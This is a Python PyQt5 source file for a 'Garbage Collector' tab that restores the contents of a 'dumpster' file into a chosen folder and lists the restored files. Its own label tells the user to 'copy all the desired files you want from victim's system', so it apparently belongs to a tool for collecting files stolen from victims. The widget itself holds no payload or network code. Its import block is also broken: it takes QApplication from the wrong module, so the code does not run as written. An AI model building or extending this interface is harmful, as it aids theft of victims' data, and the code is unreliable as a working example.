import os
from pathlib import Path
from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLineEdit, 
    QLabel, QGroupBox, QListWidget, QListWidgetItem, QFileDialog
)
from PyQt5.QtGui import QFont, QPixmap
from PyQt5.QtCore import Qt, pyqtSignal, QApplication


class GarbageCollectorWidget(QWidget):
    """Garbage Collector tab widget for file restoration."""
    
    restore_requested = pyqtSignal(str, str)
    
    def __init__(self, script_dir, parent=None):
        super().__init__(parent)
        self.script_dir = script_dir
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)
        
        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(9)
        subtitle_font = QFont()
        subtitle_font.setPointSize(9)

        # Top section
        top_widget = QWidget()
        top_layout = QHBoxLayout(top_widget)

        # Icon
        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "garbage.png")
        pixmap = QPixmap(icon_path)
        if not pixmap.isNull():
            icon_label.setPixmap(pixmap.scaled(300, 300, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        icon_label.setAlignment(Qt.AlignCenter)
        top_layout.addWidget(icon_label, 3)

        # Restore options
        restore_options_group = QGroupBox("RESTORE FILES FROM DUMPSTER")
        restore_options_group.setFont(title_font)
        restore_options_layout = QVBoxLayout(restore_options_group)

        desc_label = QLabel("Select a dumpster file and a destination directory to restore its contents.\nCopy all the desired files you want from victim's system")
        desc_label.setFont(subtitle_font)
        desc_label.setStyleSheet("color: #909090;")
        desc_label.setWordWrap(True)
        restore_options_layout.addWidget(desc_label)

        # Dumpster file path
        dumpster_file_label = QLabel("Dumpster File Path")
        dumpster_file_label.setFont(subtitle_font)
        dumpster_file_label.setStyleSheet("color: #b0b0b0;")
        dumpster_file_layout = QHBoxLayout()
        self.dumpster_file_edit = QLineEdit()
        dumpster_file_btn = QPushButton("Browse...")
        dumpster_file_btn.clicked.connect(self.browse_dumpster_file)
        dumpster_file_layout.addWidget(dumpster_file_label)
        dumpster_file_layout.addWidget(self.dumpster_file_edit)
        dumpster_file_layout.addWidget(dumpster_file_btn)
        restore_options_layout.addLayout(dumpster_file_layout)

        # Output directory
        output_dir_label = QLabel("Destination Directory")
        output_dir_label.setFont(subtitle_font)
        output_dir_label.setStyleSheet("color: #b0b0b0;")
        output_dir_layout = QHBoxLayout()
        self.output_dir_edit = QLineEdit()
        output_dir_btn = QPushButton("Browse...")
        output_dir_btn.clicked.connect(self.browse_output_directory)
        output_dir_layout.addWidget(output_dir_label)
        output_dir_layout.addWidget(self.output_dir_edit)
        output_dir_layout.addWidget(output_dir_btn)
        restore_options_layout.addLayout(output_dir_layout)

        restore_btn = QPushButton("Restore")
        restore_btn.setFont(subtitle_font)
        restore_btn.clicked.connect(self.on_restore_clicked)
        restore_options_layout.addWidget(restore_btn)
        restore_options_layout.addStretch()
        top_layout.addWidget(restore_options_group, 7)

        # Bottom section - destination files list
        bottom_widget = QWidget()
        bottom_layout = QVBoxLayout(bottom_widget)

        dest_folder_group = QGroupBox()
        dest_folder_layout = QVBoxLayout(dest_folder_group)

        dest_header_layout = QHBoxLayout()
        refresh_dest_btn = QPushButton("⟳ Refresh")
        refresh_dest_btn.clicked.connect(self.update_destination_view)
        dest_header_layout.addWidget(refresh_dest_btn, 0, Qt.AlignRight)
        dest_folder_layout.addLayout(dest_header_layout)

        self.dest_files_list = QListWidget()
        self.dest_files_list.setFont(subtitle_font)
        self.dest_files_list.setStyleSheet("background-color: #0e0e0e;")
        dest_folder_layout.addWidget(self.dest_files_list)
        bottom_layout.addWidget(dest_folder_group)

        layout.addWidget(top_widget, 4)
        layout.addWidget(bottom_widget, 6)

    def browse_dumpster_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Dumpster File", "", "All Files (*)")
        if file_path:
            home_path = str(Path.home())
            if file_path.startswith(home_path):
                self.dumpster_file_edit.setText(file_path.replace(home_path, "$HOME", 1))
            else:
                self.dumpster_file_edit.setText(file_path)

    def browse_output_directory(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Directory")
        if directory:
            home_path = str(Path.home())
            if directory.startswith(home_path):
                directory = directory.replace(home_path, "$HOME", 1)
            self.output_dir_edit.setText(directory)

    def on_restore_clicked(self):
        dumpster_file = self.dumpster_file_edit.text()
        output_dir = self.output_dir_edit.text()
        self.restore_requested.emit(dumpster_file, output_dir)

    def show_loading_view(self):
        self.dest_files_list.clear()
        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "garbage.png")
        pixmap = QPixmap(icon_path)
        if not pixmap.isNull():
            icon_label.setPixmap(pixmap.scaled(300, 300, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        else:
            icon_label.setText("Restoring...")
        list_item = QListWidgetItem()
        list_widget = QWidget()
        layout = QHBoxLayout(list_widget)
        layout.addWidget(icon_label)
        layout.setAlignment(Qt.AlignCenter)
        list_item.setSizeHint(list_widget.sizeHint())
        self.dest_files_list.addItem(list_item)
        self.dest_files_list.setItemWidget(list_item, list_widget)
        QApplication.processEvents()

    def clear_loading_view(self):
        for i in reversed(range(self.dest_files_list.count())):
            item = self.dest_files_list.takeItem(i)
            del item
        self.dest_files_list.clear()
        QApplication.processEvents()

    def update_destination_view(self):
        self.clear_loading_view()
        self.dest_files_list.clear()
        dest_dir_str = self.output_dir_edit.text()
        if not dest_dir_str:
            self.dest_files_list.addItem("Select a destination directory to see its contents.")
            return

        dest_dir = Path(dest_dir_str.replace("$HOME", str(Path.home())))
        if not dest_dir.is_dir():
            self.dest_files_list.addItem(f"Directory does not exist: {dest_dir}")
            return
        try:
            files = list(dest_dir.iterdir())
            if not files:
                self.dest_files_list.addItem("Destination directory is empty.")
                return
            for item_path in sorted(files):
                self.dest_files_list.addItem(QListWidgetItem(item_path.name))
        except Exception as e:
            self.dest_files_list.addItem(f"Error reading directory: {e}")

    def get_settings(self):
        return {
            'dumpster_file': self.dumpster_file_edit.text(),
            'output_dir': self.output_dir_edit.text()
        }

    def load_settings(self, settings):
        self.dumpster_file_edit.setText(settings.get('dumpster_file', ''))
        self.output_dir_edit.setText(settings.get('output_dir', ''))
